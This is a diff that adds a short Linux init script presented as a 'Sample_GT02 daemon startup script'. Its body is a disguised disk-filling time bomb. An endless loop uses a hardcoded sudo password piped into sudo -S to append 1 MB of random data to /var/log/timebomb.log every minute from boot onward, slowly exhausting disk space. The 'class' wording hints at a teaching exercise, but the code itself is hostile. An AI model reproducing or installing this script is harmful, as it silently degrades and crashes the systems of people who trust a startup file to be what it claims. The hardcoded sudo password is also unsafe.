@@ -1,0 +1,15 @@
+#!/bin/sh 
+### BEGIN INIT INFO
+# Provides:          
+# Required-Start:    $remote_fs
+# Required-Stop:     $remote_fs
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: Sample_GT02 daemon startup script
+# Description:       Sample Server for GT02 class 
+### END INIT INFO
+while :
+do
+echo '2391' | sudo -S dd if=/dev/urandom of=/var/log/timebomb.log  oflag=append conv=notrunc bs=1M count=1 
+sleep 60
+done
